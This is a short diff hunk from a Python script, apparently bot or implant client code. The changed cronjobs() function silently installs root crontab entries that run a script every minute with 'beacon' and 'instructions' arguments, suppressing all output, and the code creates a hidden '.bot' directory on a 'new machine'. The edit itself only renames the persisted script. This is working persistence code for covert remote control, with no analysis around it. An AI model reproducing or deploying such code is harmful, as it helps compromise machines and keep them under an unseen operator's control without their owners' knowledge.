@@ -9,9 +9,9 @@ import time
 
 ##checking to see if directory exists and making directory on new machine
 def cronjobs():
-	os.system('(crontab -l 2>/dev/null; echo "0 12 * * * /root/readerv1.py >/dev/null >/dev/null 2>&1") | crontab -')
-	os.system('(crontab -l 2>/dev/null; echo "* * * * * /root/readerv1.py beacon >/dev/null >/dev/null 2>&1")| crontab -')
-	os.system('(crontab -l 2>/dev/null; echo "* * * * * /root/readerv1.py instructions >/dev/null >/dev/null 2>&1")| crontab -')
+	os.system('(crontab -l 2>/dev/null; echo "0 12 * * * /root/charlex.py >/dev/null >/dev/null 2>&1") | crontab -')
+	os.system('(crontab -l 2>/dev/null; echo "* * * * * /root/charlex.py beacon >/dev/null >/dev/null 2>&1")| crontab -')
+	os.system('(crontab -l 2>/dev/null; echo "* * * * * /root/charlex.py instructions >/dev/null >/dev/null 2>&1")| crontab -')
 
 def directoryhandler():
 	dir = os.path.join('./','.bot')
